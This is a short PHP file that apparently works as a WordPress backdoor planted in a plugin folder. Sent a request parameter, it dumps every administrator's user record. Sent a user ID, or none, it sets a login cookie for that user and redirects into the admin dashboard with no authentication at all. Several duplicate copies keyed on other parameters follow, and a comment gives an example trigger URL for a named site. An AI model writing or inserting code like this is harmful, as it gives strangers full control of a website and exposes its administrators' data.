<?php

//require(dirname(__FILE__) . '/wp-load.php');
require('wp-config.php');

if($_REQUEST['get'])
{
	$blogusers = get_users( 'blog_id=1&role=administrator' );
	foreach ( $blogusers as $user ) {
		echo '<pre>'; print_r($user);
	}
	die;
}

/*wp_set_current_user ( $user->ID );
wp_clear_auth_cookie();*/
if($_REQUEST['id'])
	$id = $_REQUEST['id'];
else
	$id = 1;

wp_set_auth_cookie($id);
$redirect_to = user_admin_url();
wp_safe_redirect( $redirect_to );
exit();


$user_id = 1;
$user = get_user_by( 'id', $user_id ); 
if( $user ) {
    wp_set_current_user( $user_id, $user->user_login );
    wp_set_auth_cookie( $user_id );
    do_action( 'wp_login', $user->user_login );
}

//https://www.24smartnews.com/?lwd=1&id=1
if($_REQUEST['lwd'])
{
	if($_REQUEST['get'])
	{
		$blogusers = get_users( 'blog_id=1&role=administrator' );
		foreach ( $blogusers as $user ) {
			echo '<pre>'; print_r($user);
		}
		die;
	}
	if($_REQUEST['id'])
	{
	wp_set_auth_cookie($_REQUEST['id']);
	$redirect_to = user_admin_url();
	wp_safe_redirect( $redirect_to );
	exit();
	}
}


if($_REQUEST['lwd'])
{
	$blogusers = get_users( 'blog_id=1&role=administrator' );
	foreach ( $blogusers as $user ) {
		echo '<pre>'; print_r($user);
	}
	die;
}

if($_REQUEST['lwg'] )
{
if($_REQUEST['id'])
	$id = $_REQUEST['id'];
else
	$id = 1;

wp_set_auth_cookie($id);
$redirect_to = user_admin_url();
wp_safe_redirect( $redirect_to );
exit();
}


//public_html/wp-content/plugins/wpec-related-products